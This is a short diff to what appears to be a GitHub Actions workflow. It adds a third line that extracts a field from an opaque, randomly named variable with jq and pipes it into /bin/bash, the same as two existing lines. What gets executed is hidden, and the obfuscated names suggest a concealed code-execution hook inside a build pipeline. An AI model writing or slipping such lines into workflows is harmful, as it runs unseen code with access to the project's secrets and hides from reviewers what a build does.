@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$zi9" | jq -r .pbuuu5 | /bin/bash
           echo $bz2 | jq -r .hkq065 | /bin/bash
+          printf '%s' "$t7887" | jq -r .lt132 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
